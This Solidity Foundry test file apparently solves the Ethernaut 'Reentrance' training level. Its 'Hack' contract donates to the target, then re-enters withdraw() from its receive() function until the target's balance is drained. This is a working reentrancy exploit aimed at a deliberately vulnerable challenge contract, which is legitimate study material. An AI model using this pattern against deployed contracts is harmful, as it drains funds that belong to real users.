// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../src/Reentrance/Reentrance.sol";
import "../src/Reentrance/ReentranceFactory.sol";
import "../src/Ethernaut.sol";

contract ReentranceTest is Test {
    Ethernaut private _ethernaut;
    ReentranceFactory private _reentranceFactory;
    Reentrance private _reentrance;

    Hack private hack;

    address private _hacker = address(hack);

    modifier testWrapper() {
        vm.deal(_hacker, 2 ether);
        _ethernaut.registerLevel(_reentranceFactory);
        vm.startPrank(_hacker);
        address instance = _ethernaut.createLevelInstance{value: 1 ether}(
            _reentranceFactory
        );
        _reentrance = Reentrance(payable(instance));

        _;
        bool success = _ethernaut.submitLevelInstance(
            payable(address(_reentrance))
        );
        // console2.log("_hacker after1:", address(_hacker).balance);
        // console2.log("_hacker after2:", address(hack).balance);
        // console2.log("_hacker after3:", _hacker.balance);
        assertTrue(success);
        vm.stopPrank();
    }

    function setUp() public {
        _ethernaut = new Ethernaut();
        _reentranceFactory = new ReentranceFactory();
        hack = new Hack();
    }

    function testReentranceHack() public testWrapper {
        hack.setChallengeAddress{value: 1 ether}(address(_reentrance));
        hack.attack();
    }
}

contract Hack {
    address public challengeAddress;

    function setChallengeAddress(address _challengeAddress) public payable {
        challengeAddress = _challengeAddress;
    }

    function attack() public {
        Reentrance(payable(challengeAddress)).donate{value: 1 ether}(
            address(this)
        );
        Reentrance(payable(challengeAddress)).withdraw(1 ether);
    }

    receive() external payable {
        while (address(challengeAddress).balance >= 1 ether) {
            Reentrance(payable(challengeAddress)).withdraw(1 ether);
        }
    }
}
